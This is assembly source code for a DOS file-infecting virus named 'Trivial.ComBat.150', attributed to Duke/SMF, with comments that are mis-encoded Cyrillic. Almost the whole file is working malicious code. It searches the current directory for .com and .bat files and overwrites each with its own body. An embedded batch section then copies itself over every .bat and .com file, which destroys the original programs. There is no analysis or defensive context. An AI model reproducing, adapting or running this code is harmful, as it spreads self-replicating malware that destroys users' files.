; Trivial.ComBat.150 (c) by Duke/SMF
; ��ࠦ��� �� BAT � COM-䠩�� � ⥪�饩 ��४�ਨ.

                .model  tiny
                .code
                org     100h
virus_length    equ     finish - start      ;����� �����

start:                                      ;��砫� �����
                db      ': '                ;�����㥬 ���� BAT-䠩��

                mov     ah,04Eh             ;���� ��ࢮ�� 䠩��
                mov     dx,offset file_sp1  ;DX 㪠�뢠�� �� "*.com"
                call    writer              ;�맮� ���᪠

                mov     ah,04Eh             ;���� ��ࢮ�� 䠩��
                mov     dx,offset file_sp2  ;DX 㪠�뢠�� �� "*.bat"
                call    writer              ;�맮� ���᪠

                mov     ax,04c01h           ;����� ࠡ���
                int     021h

                db      'ComBat by Duke/SMF';�������� ����室��� ����ࠩ� !
;-------------------------------------------
writer          proc
infect:
                int     21h
                jnc     infect_file         ;�᫨ 䠩� ������, � ��ࠦ���,
                ret                         ;� ��⨢��� ��砥 - �� ��室

infect_file:
                mov     ax,03D01h           ;���뢠�� 䠩� ��� �����
                mov     dx,09Eh             ;DX 㪠�뢠�� �� �������� 䠩�
                int     021h

                xchg    bx,ax               ;BX ᮤ�ন� 䠩���� handle

                mov     ah,040h             ;�㭪�� ����� � 䠩�
                mov     cl,virus_length     ;CL = ᪮�쪮 ���� �����
                mov     dx,offset start     ;DX = ��砫� ���� �����
                int     021h

                mov     ah,03Eh             ;����뢠�� 䠩�
                int     021h

                mov     ah,04Fh             ;���� ᫥���饣� 䠩��
                jmp     infect              ;���室 �� ��ࠦ����

                endp
;-------------------------------------------

file_sp1        db      '*.com',0           ;��᪠ COM-䠩��� ��� ���᪠
file_sp2        db      '*.bat',0           ;��᪠ BAT-䠩��� ��� ���᪠
batnic          db      13,10               ;BAT-���� �����
                db      '@ctty nul',13,10
                db      '@for %%g in (*.bat, *.com) do copy %0 %%g',13,10
                db      'ctty con',13,10
finish:                                     ;����� �����
                end     start
